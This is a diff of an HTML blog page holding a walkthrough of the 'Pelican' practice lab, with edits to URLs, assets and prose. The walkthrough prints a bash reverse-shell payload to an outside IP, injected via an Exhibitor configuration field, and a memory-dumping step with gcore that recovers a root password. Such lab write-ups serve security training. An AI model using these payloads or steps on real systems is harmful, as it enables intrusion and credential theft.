@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
   <title>
   Pelican Offsec Walkthrough · Chief Dennis&#39; Blog
 </title>
@@ -22,7 +22,7 @@
   <meta name="twitter:title" content="Pelican Offsec Walkthrough">
   <meta name="twitter:description" content="Full exploitation of the Pelican target: Exhibitor unauthenticated RCE, ZooKeeper misconfig, memory-dump privilege escalation, and root compromise.">
 
-<meta property="og:url" content="http://localhost:1313/posts/pelican-walkthrough/">
+<meta property="og:url" content="https://chiefdennis.github.io/posts/pelican-walkthrough/">
   <meta property="og:site_name" content="Chief Dennis&#39; Blog">
   <meta property="og:title" content="Pelican Offsec Walkthrough">
   <meta property="og:description" content="Full exploitation of the Pelican target: Exhibitor unauthenticated RCE, ZooKeeper misconfig, memory-dump privilege escalation, and root compromise.">
@@ -37,15 +37,16 @@
     <meta property="article:tag" content="Gdump">
     <meta property="article:tag" content="SUID">
     <meta property="article:tag" content="Password-Store">
-      <meta property="og:see_also" content="http://localhost:1313/posts/clamav-walkthrough/">
-      <meta property="og:see_also" content="http://localhost:1313/posts/offsec_cockpit/">
-      <meta property="og:see_also" content="http://localhost:1313/posts/offsec_dvr4/">
-      <meta property="og:see_also" content="http://localhost:1313/posts/offsec_snookum/">
+      <meta property="og:see_also" content="https://chiefdennis.github.io/posts/payday-walkthrough/">
+      <meta property="og:see_also" content="https://chiefdennis.github.io/posts/clamav-walkthrough/">
+      <meta property="og:see_also" content="https://chiefdennis.github.io/posts/offsec_cockpit/">
+      <meta property="og:see_also" content="https://chiefdennis.github.io/posts/offsec_dvr4/">
+      <meta property="og:see_also" content="https://chiefdennis.github.io/posts/offsec_snookum/">
 
 
 
 
-<link rel="canonical" href="http://localhost:1313/posts/pelican-walkthrough/">
+<link rel="canonical" href="https://chiefdennis.github.io/posts/pelican-walkthrough/">
 
 
 <link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
@@ -55,7 +56,7 @@
 
   
   
-  <link rel="stylesheet" href="/css/coder.css" media="screen">
+  <link rel="stylesheet" href="/css/coder.min.ed30115a76cdaa62f2229e973d5b1c89b2d3dd4b1d9c07a729baad06aa3b0cbe.css" integrity="sha256-7TARWnbNqmLyIp6XPVscibLT3UsdnAenKbqtBqo7DL4=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -65,7 +66,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -73,7 +74,7 @@
  
   
     
-    <link rel="stylesheet" href="/css/custom.css" media="screen">
+    <link rel="stylesheet" href="/css/custom.min.de332fc1405ae8603f697e77d3ffe869fde950cc77184ea542dc2be374a0b92b.css" integrity="sha256-3jMvwUBa6GA/aX530//oaf3pUMx3GE6lQtwr43SguSs=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -118,7 +119,7 @@
     <nav class="navigation">
   <section class="container">
     
-    <a class="navigation-title" href="http://localhost:1313/">
+    <a class="navigation-title" href="https://chiefdennis.github.io/">
       Chief Dennis&#39; Blog
     </a>
     
@@ -165,7 +166,7 @@
       <header>
         <div class="post-title">
           <h1 class="title">
-            <a class="title-link" href="http://localhost:1313/posts/pelican-walkthrough/">
+            <a class="title-link" href="https://chiefdennis.github.io/posts/pelican-walkthrough/">
               Pelican Offsec Walkthrough
             </a>
           </h1>
@@ -239,8 +240,7 @@
   </a>
 </h2>
 <p><img alt="image" src="/posts/pelican-walkthrough/Picture_0.png"></p>
-<p>This walkthrough covers the full exploitation path for the Pelican target, from initial reconnaissance to root compromise and post-exploitation considerations.<br>
-We focus on service enumeration, misconfigurations, abusing an exposed Exhibitor instance, credential extraction through memory dumping, and privilege escalation.</p>
+<p>This walkthrough covers the full exploitation path for the Pelican target, from initial reconnaissance to root compromise and post-exploitation considerations. We focus on service enumeration, misconfigurations, abusing an exposed Exhibitor instance, credential extraction through memory dumping, and privilege escalation.</p>
 <h3 id="1-reconnaissance">
   1. Reconnaissance
   <a class="heading-link" href="#1-reconnaissance">
@@ -291,12 +291,11 @@ We focus on service enumeration, misconfigurations, abusing an exposed Exhibitor
 </h3>
 <p>The unauthenticated Exhibitor panel is vulnerable to remote code execution as documented here:</p>
 <p><a href="https://www.exploit-db.com/exploits/48654"  class="external-link" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/48654</a></p>
-<p>This exploit works because Exhibitor allows modification of ZooKeeper configuration fields.<br>
-When these fields are saved, certain fields are <em>executed</em> by the system — leading directly to RCE.</p>
+<p>This exploit works because Exhibitor allows modification of ZooKeeper configuration fields. When these fields are saved, certain fields are <em>executed</em> by the system — leading directly to RCE.</p>
 <p>A reverse shell payload is injected into a configuration field:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">$(</span>bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.45.177/1234 0&gt;&amp;1&#39;</span><span class="k">)</span>
-</span></span></code></pre></div><p>We place this payload into one of the editable fields and click Save.<br>
-Once Exhibitor reloads the configuration, the system executes the payload and triggers our reverse shell listener.</p>
+</span></span></code></pre></div><p>We place this payload into one of the editable fields and click Save.</p>
+<p>Once Exhibitor reloads the configuration, the system executes the payload and triggers our reverse shell listener.</p>
 <p><img alt="image" src="/posts/pelican-walkthrough/Picture_4.png"></p>
 <p>Complete payload example:</p>
 <p><img alt="image" src="/posts/pelican-walkthrough/Picture_5.png"></p>
@@ -314,25 +313,22 @@ Once Exhibitor reloads the configuration, the system executes the payload and tr
 <code>linpeas</code> reveals an interesting sudo entry:</p>
 <p><img alt="image" src="/posts/pelican-walkthrough/Picture_7.png"></p>
 <p>We can run:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo /bin/gdump
-</span></span></code></pre></div><p>This binary is effectively a wrapper around process-dumping functionality, similar to <code>gcore</code>.<br>
-It allows privileged users to dump the memory of another process — which is a powerful primitive when misconfigured.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo /bin/gcore
+</span></span></code></pre></div><p>This binary allows privileged users to dump the memory of another process — which is a powerful primitive when misconfigured.</p>
 <p>Additionally, a strange SUID binary named password-store is found:</p>
 <p><img alt="image" src="/posts/pelican-walkthrough/Picture_8.png"></p>
 <p>This hints that some automated process is handling or storing credentials in memory — a prime target for dumping.</p>
 <p>To identify relevant running processes, <code>pspy</code> is used:</p>
 <p><img alt="image" src="/posts/pelican-walkthrough/Picture_9.png"></p>
 <p>We observe that a process related to the password-store or authentication runs with PID 494.</p>
-<p>Since we can dump arbitrary process memory via <code>sudo gdump</code>, we extract it:</p>
+<p>Since we can dump arbitrary process memory via <code>sudo gcore</code>, we extract it:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo /bin/gcore -a -o output.txt <span class="m">494</span>
-</span></span></code></pre></div><p>This produces a large ELF core dump.<br>
-We extract readable strings:</p>
+</span></span></code></pre></div><p>This produces a large ELF core dump. We extract readable strings:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">strings output.txt.494 &gt; output_cleaned.txt
 </span></span></code></pre></div><p><img alt="image" src="/posts/pelican-walkthrough/Picture_10.png"></p>
 <p>Then search for password-like values inside:</p>
 <p><img alt="image" src="/posts/pelican-walkthrough/Picture_11.png"></p>
-<p>A valid root password is found embedded in the dump.<br>
-This confirms the high-impact misconfiguration: sensitive credentials stored in memory + unrestricted memory dump tool = privilege escalation.</p>
+<p>A valid root password is found embedded in the dump. This confirms the high-impact misconfiguration: sensitive credentials stored in memory + unrestricted memory dump tool = privilege escalation.</p>
 <p>Switch to root:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">su root
 </span></span></code></pre></div><p>Root access achieved — full compromise. PWNED :)</p>
@@ -442,6 +438,12 @@ Mitigations:</p>
         
         
           
+            <li>
+              <a href="/posts/payday-walkthrough/">Payday Offsec Walkthrough</a>
+            </li>
+          
+        
+          
         
           
             <li>
@@ -506,7 +508,7 @@ Mitigations:</p>
 
   
   
-  <script src="/js/coder.js"></script>
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
   
 
   
